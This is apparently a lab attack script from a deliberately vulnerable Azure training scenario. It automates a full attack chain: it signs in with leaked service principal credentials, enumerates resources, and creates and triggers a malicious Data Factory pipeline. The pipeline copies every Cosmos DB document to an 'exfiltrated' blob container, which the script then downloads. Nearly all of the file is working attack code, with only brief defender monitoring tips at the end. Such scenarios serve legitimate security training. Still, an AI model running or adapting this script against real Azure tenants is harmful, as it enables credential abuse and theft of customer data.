#!/usr/bin/env bash
set -euo pipefail

#############################################
# Pretty TUI: colors, banner, spinner, utils
#############################################

if [ -t 1 ] && [ -z "${NO_COLOR:-}" ]; then
  if command -v tput >/dev/null 2>&1 && [ "$(tput colors 2>/dev/null || echo 0)" -ge 8 ]; then
    RED="$(tput setaf 1)"; GREEN="$(tput setaf 2)"; YELLOW="$(tput setaf 3)"; BLUE="$(tput setaf 4)"
    MAGENTA="$(tput setaf 5)"; CYAN="$(tput setaf 6)"; BOLD="$(tput bold)"; RESET="$(tput sgr0)"
  else
    RED=$'\033[31m'; GREEN=$'\033[32m'; YELLOW=$'\033[33m'; BLUE=$'\033[34m'
    MAGENTA=$'\033[35m'; CYAN=$'\033[36m'; BOLD=$'\033[1m'; RESET=$'\033[0m'
  fi
else
  RED=""; GREEN=""; YELLOW=""; BLUE=""; MAGENTA=""; CYAN=""; BOLD=""; RESET=""
fi

step() { printf "\n[%s] %s[*]%s %s\n" "$(date +%H:%M:%S)" "${YELLOW}" "${RESET}" "$*"; }
ok()   { printf "[%s] %s[OK]%s  %s\n" "$(date +%H:%M:%S)" "${GREEN}" "${RESET}" "$*"; }
err()  { printf "[%s] %s[ERR]%s %s\n" "$(date +%H:%M:%S)" "${RED}" "${RESET}" "$*"; }
info() { printf "%s[i]%s   %s\n"  "${BLUE}"   "${RESET}" "$*"; }

printf "%s%s%s\n" "${BOLD}${GREEN}" "  ________  ___  _____          __     " "${RESET}"
printf "%s%s%s\n" "${BOLD}${GREEN}" " / ___/ _ \\/ _ \\/ ___/__  ___ _/ /_    " "${RESET}"
printf "%s%s%s\n" "${BOLD}${GREEN}" "/ /__/ // / , _/ (_ / _ \\/ _ \`/ __/   " "${RESET}"
printf "%s%s%s\n" "${BOLD}${GREEN}" "\\___/____/_/|_|\\___/\\___/\\_,_/\\__/" "${RESET}"
printf "\n"

SPIN_PID=""
spin_start() {
  local msg="$*"
  printf "%s[>] %s%s " "${MAGENTA}" "${msg}" "${RESET}"
  ( while :; do
      for c in '⠋' '⠙' '⠹' '⠸' '⠼' '⠴' '⠦' '⠧' '⠇' '⠏'; do
        printf "\r%s[>] %s%s %s" "${MAGENTA}" "${msg}" "${RESET}" "$c"
        sleep 0.08
      done
    done ) & SPIN_PID=$!
  disown || true
}
spin_stop() { [ -n "${SPIN_PID}" ] && kill "${SPIN_PID}" >/dev/null 2>&1 || true; SPIN_PID=""; printf "\r%*s\r" 120 ""; }

banner() {
  printf "%s%s%s\n" "${BOLD}${CYAN}" "===       CDRGoat Azure - Scenario 10                ===" "${RESET}"
  printf "%sLeaked SP → Data Factory Pipeline Injection → Cosmos DB Exfiltration%s\n\n" "${GREEN}" "${RESET}"
  printf "This automated attack script will:\n"
  printf "  • Step 1. Authenticate using leaked SP credentials\n"
  printf "  • Step 2. Enumerate resources and discover Data Factory\n"
  printf "  • Step 3. Inspect Data Factory linked services and pipelines\n"
  printf "  • Step 4. Create a malicious pipeline using existing linked services\n"
  printf "  • Step 5. Trigger the pipeline to exfiltrate Cosmos DB data\n"
  printf "  • Step 6. Download exfiltrated data from blob storage\n"
}
banner

#############################################
# Preflight checks
#############################################
step "Preflight checks"
missing=0
for c in curl jq; do
  if ! command -v "$c" >/dev/null 2>&1; then err "Missing dependency: $c"; missing=1; fi
done
[ "$missing" -eq 0 ] && ok "All required tools present" || { err "Install missing tools and re-run"; exit 2; }

#############################################
# Step 1. Authenticate
#############################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 1. Authenticate using leaked SP credentials  ===" "${RESET}"

step "Credential input"
printf "Enter the leaked Service Principal credentials:\n\n"

read -r -p "  Client ID: " CLIENT_ID
read -r -p "  Client Secret: " CLIENT_SECRET
read -r -p "  Tenant ID: " TENANT_ID

if [ -z "$CLIENT_ID" ] || [ -z "$CLIENT_SECRET" ] || [ -z "$TENANT_ID" ]; then
  err "All credential fields are required"
  exit 1
fi

step "Authenticating to Azure"
spin_start "Requesting ARM token"

set +e
TOKEN_RESPONSE="$(curl -sS -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "client_id=${CLIENT_ID}&client_secret=${CLIENT_SECRET}&grant_type=client_credentials&resource=https://management.azure.com" \
  "https://login.microsoftonline.com/${TENANT_ID}/oauth2/token")"
CURL_RC=$?
set -e
spin_stop

AZURE_TOKEN="$(echo "$TOKEN_RESPONSE" | jq -r '.access_token')"

if [ $CURL_RC -ne 0 ] || [ -z "$AZURE_TOKEN" ] || [ "$AZURE_TOKEN" = "null" ]; then
  err "Authentication failed"
  exit 1
fi

ok "Authenticated as leaked SP"

SUBS_JSON="$(curl -sS -H "Authorization: Bearer $AZURE_TOKEN" \
  "https://management.azure.com/subscriptions?api-version=2022-12-01")"
SUBSCRIPTION_ID="$(echo "$SUBS_JSON" | jq -r '.value[0].subscriptionId')"

ok "Subscription: ${YELLOW}${SUBSCRIPTION_ID}${RESET}"

read -r -p "Step 1 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

#############################################
# Step 2. Enumerate resources
#############################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 2. Enumerate resources and discover Data Factory  ===" "${RESET}"

step "Listing resources"
spin_start "Calling ARM resources API"

RESOURCES_JSON="$(curl -sS -H "Authorization: Bearer $AZURE_TOKEN" \
  "https://management.azure.com/subscriptions/${SUBSCRIPTION_ID}/resources?api-version=2022-12-01")"

spin_stop

RESOURCE_GROUP="$(echo "$RESOURCES_JSON" | jq -r '.value[0].id | split("/")[4]')"
ok "Resource Group: ${YELLOW}${RESOURCE_GROUP}${RESET}"

echo "$RESOURCES_JSON" | jq -r --arg Y "$YELLOW" --arg R "$RESET" \
  '.value[] | "  • [\(.type)] \($Y)\(.name)\($R)"'

ADF_NAME="$(echo "$RESOURCES_JSON" | jq -r '.value[] | select(.type == "Microsoft.DataFactory/factories") | .name')"
COSMOS_NAME="$(echo "$RESOURCES_JSON" | jq -r '.value[] | select(.type == "Microsoft.DocumentDB/databaseAccounts") | .name')"
STORAGE_NAME="$(echo "$RESOURCES_JSON" | jq -r '.value[] | select(.type == "Microsoft.Storage/storageAccounts") | .name')"

info "Data Factory:    ${YELLOW}${ADF_NAME}${RESET}"
info "Cosmos DB:       ${YELLOW}${COSMOS_NAME}${RESET}"
info "Storage Account: ${YELLOW}${STORAGE_NAME}${RESET}"

step "Attempting direct Cosmos DB access"
spin_start "Testing Cosmos DB data plane"

set +e
COSMOS_ENDPOINT="https://${COSMOS_NAME}.documents.azure.com"
COSMOS_DBS="$(curl -sS -H "Authorization: Bearer $AZURE_TOKEN" \
  "${COSMOS_ENDPOINT}/dbs" -H "x-ms-version: 2018-12-31" 2>&1)"
set -e
spin_stop

err "Direct Cosmos DB access denied (no data plane credentials)"

#############################################
# Operator explanation
#############################################
printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "We cannot access Cosmos DB directly — the SP lacks data plane keys.\n"
printf "However, we have ${MAGENTA}Data Factory Contributor${RESET} role.\n\n"
printf "This means we can create/modify pipelines that use existing linked\n"
printf "services. ADF resolves credentials via its own MI — the attacker\n"
printf "${RED}never sees the Cosmos DB key${RESET} but can use it through pipelines.\n\n"

read -r -p "Step 2 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

#############################################
# Step 3. Inspect Data Factory
#############################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 3. Inspect Data Factory linked services and pipelines  ===" "${RESET}"

ADF_BASE="https://management.azure.com/subscriptions/${SUBSCRIPTION_ID}/resourceGroups/${RESOURCE_GROUP}/providers/Microsoft.DataFactory/factories/${ADF_NAME}"

step "Listing linked services"
spin_start "Querying ADF linked services"

LINKED_SERVICES="$(curl -sS -H "Authorization: Bearer $AZURE_TOKEN" \
  "${ADF_BASE}/linkedservices?api-version=2018-06-01")"

spin_stop

LS_COUNT="$(echo "$LINKED_SERVICES" | jq '.value | length')"
ok "Found ${YELLOW}${LS_COUNT}${RESET} linked services"

echo "$LINKED_SERVICES" | jq -r --arg Y "$YELLOW" --arg R "$RESET" \
  '.value[] | "  • \($Y)\(.name)\($R) (type: \(.properties.type))"'

step "Listing datasets"
spin_start "Querying ADF datasets"

DATASETS="$(curl -sS -H "Authorization: Bearer $AZURE_TOKEN" \
  "${ADF_BASE}/datasets?api-version=2018-06-01")"

spin_stop

DS_COUNT="$(echo "$DATASETS" | jq '.value | length')"
ok "Found ${YELLOW}${DS_COUNT}${RESET} datasets"

echo "$DATASETS" | jq -r --arg Y "$YELLOW" --arg R "$RESET" \
  '.value[] | "  • \($Y)\(.name)\($R) (type: \(.properties.type))"'

step "Listing existing pipelines"
spin_start "Querying ADF pipelines"

PIPELINES="$(curl -sS -H "Authorization: Bearer $AZURE_TOKEN" \
  "${ADF_BASE}/pipelines?api-version=2018-06-01")"

spin_stop

PIPE_COUNT="$(echo "$PIPELINES" | jq '.value | length')"
ok "Found ${YELLOW}${PIPE_COUNT}${RESET} pipelines"

echo "$PIPELINES" | jq -r --arg Y "$YELLOW" --arg R "$RESET" \
  '.value[] | "  • \($Y)\(.name)\($R)"'

# Inspect the existing pipeline
EXISTING_PIPE_NAME="$(echo "$PIPELINES" | jq -r '.value[0].name')"
step "Inspecting pipeline: ${EXISTING_PIPE_NAME}"

PIPE_DETAIL="$(curl -sS -H "Authorization: Bearer $AZURE_TOKEN" \
  "${ADF_BASE}/pipelines/${EXISTING_PIPE_NAME}?api-version=2018-06-01")"

echo "$PIPE_DETAIL" | jq '.properties.activities[] | {name, type, source: .typeProperties.source.type, sink: .typeProperties.sink.type}'

#############################################
# Operator explanation
#############################################
printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "We discovered the Data Factory has:\n"
printf "  • Cosmos DB linked service (with live credentials)\n"
printf "  • Blob Storage linked service\n"
printf "  • A pipeline that copies Cosmos → Blob\n\n"
printf "As ${MAGENTA}Data Factory Contributor${RESET}, we can create a NEW pipeline that\n"
printf "uses the same linked services. The ADF runtime resolves credentials\n"
printf "at execution time — we just need to reference the linked services.\n\n"

read -r -p "Step 3 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

#############################################
# Step 4. Create malicious pipeline
#############################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 4. Create malicious pipeline to exfiltrate Cosmos DB  ===" "${RESET}"

# Get dataset names
COSMOS_DATASET="$(echo "$DATASETS" | jq -r '.value[] | select(.properties.type == "CosmosDbSqlApiCollection") | .name')"
BLOB_DATASET="$(echo "$DATASETS" | jq -r '.value[] | select(.properties.type == "Json") | .name')"
BLOB_LS_NAME="$(echo "$LINKED_SERVICES" | jq -r '.value[] | select(.properties.type == "AzureBlobStorage") | .name')"

step "Creating exfiltration dataset (new blob output)"
spin_start "Creating dataset for exfiltrated data"

EXFIL_DATASET_NAME="ExfilDataset"

set +e
curl -sS -X PUT \
  -H "Authorization: Bearer $AZURE_TOKEN" \
  -H "Content-Type: application/json" \
  "${ADF_BASE}/datasets/${EXFIL_DATASET_NAME}?api-version=2018-06-01" \
  -d "{
    \"properties\": {
      \"type\": \"Json\",
      \"linkedServiceName\": {
        \"referenceName\": \"${BLOB_LS_NAME}\",
        \"type\": \"LinkedServiceReference\"
      },
      \"typeProperties\": {
        \"location\": {
          \"type\": \"AzureBlobStorageLocation\",
          \"container\": \"exfiltrated\",
          \"folderPath\": \"cosmos-dump\",
          \"fileName\": \"all-customers.json\"
        }
      },
      \"schema\": {}
    }
  }" >/dev/null
set -e
spin_stop
ok "Exfiltration dataset created"

MALICIOUS_PIPE_NAME="attacker-exfil-pipeline"

step "Creating malicious pipeline"
spin_start "Deploying pipeline via ARM API"

set +e
CREATE_RESP="$(curl -sS -X PUT \
  -H "Authorization: Bearer $AZURE_TOKEN" \
  -H "Content-Type: application/json" \
  "${ADF_BASE}/pipelines/${MALICIOUS_PIPE_NAME}?api-version=2018-06-01" \
  -d "{
    \"properties\": {
      \"activities\": [{
        \"name\": \"ExfilCosmosData\",
        \"type\": \"Copy\",
        \"inputs\": [{
          \"referenceName\": \"${COSMOS_DATASET}\",
          \"type\": \"DatasetReference\"
        }],
        \"outputs\": [{
          \"referenceName\": \"${EXFIL_DATASET_NAME}\",
          \"type\": \"DatasetReference\"
        }],
        \"typeProperties\": {
          \"source\": {
            \"type\": \"CosmosDbSqlApiSource\",
            \"query\": \"SELECT * FROM c\"
          },
          \"sink\": {
            \"type\": \"JsonSink\",
            \"storeSettings\": {
              \"type\": \"AzureBlobStorageWriteSettings\"
            },
            \"formatSettings\": {
              \"type\": \"JsonWriteSettings\"
            }
          }
        }
      }]
    }
  }")"
set -e
spin_stop

if echo "$CREATE_RESP" | jq -e '.error' >/dev/null 2>&1; then
  err "Failed to create pipeline"
  echo "$CREATE_RESP" | jq '.error'
  exit 1
fi

ok "Malicious pipeline created: ${RED}${MALICIOUS_PIPE_NAME}${RESET}"

#############################################
# Operator explanation
#############################################
printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
printf "We created a malicious pipeline that:\n"
printf "  • Uses the existing Cosmos DB linked service as ${YELLOW}source${RESET}\n"
printf "  • Copies ALL documents (SELECT * FROM c) to a blob ${RED}sink${RESET}\n"
printf "  • Outputs to the 'exfiltrated' container\n\n"
printf "The attacker ${RED}never sees the Cosmos DB key${RESET} — ADF resolves it\n"
printf "at runtime using its own credentials. This is 'living off the land'.\n\n"

read -r -p "Step 4 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

#############################################
# Step 5. Trigger the pipeline
#############################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 5. Trigger pipeline to exfiltrate Cosmos DB data  ===" "${RESET}"

step "Triggering pipeline execution"
spin_start "POST createRun"

set +e
RUN_RESP="$(curl -sS -X POST \
  -H "Authorization: Bearer $AZURE_TOKEN" \
  -H "Content-Type: application/json" \
  "${ADF_BASE}/pipelines/${MALICIOUS_PIPE_NAME}/createRun?api-version=2018-06-01" \
  -d '{}')"
set -e
spin_stop

RUN_ID="$(echo "$RUN_RESP" | jq -r '.runId // empty')"

if [ -z "$RUN_ID" ]; then
  err "Failed to trigger pipeline"
  echo "$RUN_RESP" | jq .
  exit 1
fi

ok "Pipeline triggered — Run ID: ${YELLOW}${RUN_ID}${RESET}"

step "Waiting for pipeline execution"
spin_start "Polling pipeline run status"

for i in $(seq 1 30); do
  sleep 10
  RUN_STATUS_JSON="$(curl -sS -H "Authorization: Bearer $AZURE_TOKEN" \
    "${ADF_BASE}/pipelineruns/${RUN_ID}?api-version=2018-06-01")"
  RUN_STATUS="$(echo "$RUN_STATUS_JSON" | jq -r '.status')"
  if [ "$RUN_STATUS" = "Succeeded" ] || [ "$RUN_STATUS" = "Failed" ] || [ "$RUN_STATUS" = "Cancelled" ]; then
    break
  fi
done

spin_stop

if [ "$RUN_STATUS" = "Succeeded" ]; then
  ok "Pipeline execution ${GREEN}succeeded${RESET}!"
else
  err "Pipeline execution status: ${RUN_STATUS}"
  echo "$RUN_STATUS_JSON" | jq '.message // empty'
fi

read -r -p "Step 5 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

#############################################
# Step 6. Download exfiltrated data
#############################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 6. Download exfiltrated data from blob storage  ===" "${RESET}"

step "Getting storage token"
spin_start "Requesting storage token"

set +e
STORAGE_TOKEN_RESP="$(curl -sS -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "client_id=${CLIENT_ID}&client_secret=${CLIENT_SECRET}&grant_type=client_credentials&resource=https://storage.azure.com" \
  "https://login.microsoftonline.com/${TENANT_ID}/oauth2/token")"
set -e

STORAGE_TOKEN="$(echo "$STORAGE_TOKEN_RESP" | jq -r '.access_token // empty')"
spin_stop

if [ -z "$STORAGE_TOKEN" ]; then
  err "Failed to get storage token"
  exit 1
fi

ok "Storage token acquired"

step "Listing exfiltrated blobs"
spin_start "Enumerating blobs in 'exfiltrated' container"

BLOBS_XML="$(curl -sS \
  -H "Authorization: Bearer $STORAGE_TOKEN" \
  -H "x-ms-version: 2020-10-02" \
  "https://${STORAGE_NAME}.blob.core.windows.net/exfiltrated?restype=container&comp=list")"

spin_stop

BLOB_NAMES="$(echo "$BLOBS_XML" | grep -oP '<Name>\K[^<]+' || echo "$BLOBS_XML" | sed -n 's/.*<Name>\([^<]*\)<\/Name>.*/\1/p')"

ok "Exfiltrated blobs:"
echo "$BLOB_NAMES" | while read -r bn; do
  [ -n "$bn" ] && printf "  • %s%s%s\n" "$YELLOW" "$bn" "$RESET"
done

step "Downloading exfiltrated Cosmos DB data"

printf "\n%s%s%s\n" "${BOLD}${RED}" "=== EXFILTRATED COSMOS DB DATA ===" "${RESET}"

echo "$BLOB_NAMES" | while read -r blob; do
  [ -z "$blob" ] && continue
  printf "\n  %s--- %s ---%s\n" "$YELLOW" "$blob" "$RESET"
  curl -sS \
    -H "Authorization: Bearer $STORAGE_TOKEN" \
    -H "x-ms-version: 2020-10-02" \
    "https://${STORAGE_NAME}.blob.core.windows.net/exfiltrated/${blob}" | jq . 2>/dev/null || cat
  printf "\n"
done

################################################################################
# Cleanup
################################################################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Cleanup  ===" "${RESET}"

read -r -p "Delete malicious pipeline and dataset? [y/N]: " CLEANUP_CONFIRM

if [[ "$CLEANUP_CONFIRM" =~ ^[Yy]$ ]]; then
  spin_start "Deleting malicious pipeline"
  curl -sS -X DELETE -H "Authorization: Bearer $AZURE_TOKEN" \
    "${ADF_BASE}/pipelines/${MALICIOUS_PIPE_NAME}?api-version=2018-06-01" >/dev/null
  spin_stop
  ok "Pipeline deleted"

  spin_start "Deleting exfil dataset"
  curl -sS -X DELETE -H "Authorization: Bearer $AZURE_TOKEN" \
    "${ADF_BASE}/datasets/${EXFIL_DATASET_NAME}?api-version=2018-06-01" >/dev/null
  spin_stop
  ok "Dataset deleted"
fi

################################################################################
# Final Summary
################################################################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Attack Simulation Complete  ===" "${RESET}"

printf "\n%s%s%s\n" "${BOLD}${GREEN}" "Attack chain executed:" "${RESET}"
printf "  1. Authenticated with leaked SP (Data Factory Contributor + Reader)\n"
printf "  2. Enumerated resources — found Data Factory, Cosmos DB, Storage\n"
printf "  3. Inspected ADF linked services and existing pipeline structure\n"
printf "  4. Created malicious pipeline using existing Cosmos DB linked service\n"
printf "  5. Triggered pipeline — ADF copied all Cosmos DB data to blob storage\n"
printf "  6. Downloaded exfiltrated data from the blob container\n\n"

printf "%s%s%s\n" "${BOLD}${RED}" "Impact:" "${RESET}"
printf "  • Full Cosmos DB data exfiltrated (customer PII, financial data)\n"
printf "  • Attacker never saw Cosmos DB credentials directly\n"
printf "  • ADF pipeline used legitimate credentials (living off the land)\n\n"

printf "%s\n" "Defenders should monitor for:"
printf "  • New pipeline creation in Data Factory\n"
printf "  • Pipeline execution to unexpected output containers\n"
printf "  • Data Factory audit logs for unusual SP activity\n"
printf "  • Blob container creation or writes by ADF to new destinations\n"
